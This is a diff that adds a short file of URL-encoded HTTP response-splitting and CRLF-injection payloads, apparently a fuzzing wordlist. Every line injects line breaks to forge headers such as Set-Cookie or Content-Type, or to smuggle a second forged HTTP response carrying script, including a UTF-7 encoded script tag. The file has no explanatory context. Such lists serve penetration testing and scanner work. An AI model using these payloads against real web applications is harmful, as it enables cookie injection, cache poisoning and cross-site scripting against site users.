@@ -1,0 +1,11 @@
+%0d%0AContent-Length:%200%0d%0A%0d%0AHTTP/1.1%20200%20OK%0d%0AContent-Length:%2016%0d%0A%0d%0A&lt;html&gt;PAYLOAD&lt;/html&gt;
+PAYLOAD%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2029%0d%0a%0d%0a<script>alert("PAYLOAD")</script>
+%0D%0ASet-Cookie%3APAYLOAD
+%0AContent-Type:html%0A%0A%3Cbody%20onload=alert(%22PAYLOAD%22)%3E
+%0AContent-Type:text/html%0A%0A%3Cscript%3Ealert(%22PAYLOAD%22)%3C/script%3Ehttp://www.test.com
+%0AContent-type:%20html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22PAYLOAD%22)%3C/script%3E
+%0AExpect:%20%3Cscript%3Ealert(%22PAYLOAD%22)%3C/script%3E
+%0d%0aContent-Type: text/html%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified: Wed, 13 Jan 2006 12:44:23 GMT%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>PAYLOAD</html>%20HTTP/1.1
+%0d%0aContent-Type: text/html%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aCache-Control: no-cache%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>PAYLOAD</html>%20HTTP/1.1
+%0d%0aContent-Type: text/html%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aPragma:no-cache%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>PAYLOAD</html>%20HTTP/1.1
+%0d%0AContent-Type: text/html;charset=UTF-7%0A%0A%2BADw-script%2BAD4-alert('PAYLOAD');%2BADw-/script%2BAD4-
